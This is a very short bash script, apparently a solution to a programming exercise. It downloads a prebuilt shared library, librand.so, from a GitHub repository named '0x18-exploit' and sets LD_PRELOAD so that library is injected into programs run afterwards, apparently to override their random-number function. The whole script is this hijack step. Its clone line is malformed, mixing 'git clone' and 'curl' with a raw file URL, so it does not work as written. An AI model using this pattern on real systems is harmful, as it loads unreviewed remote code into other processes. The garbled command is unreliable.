#!/bin/bash
git clone curl https://github.com/Ehijoe/0x18-exploit/raw/main/librand.so /tmp/exploit
export LD_PRELOAD=/tmp/exploit/librand.so
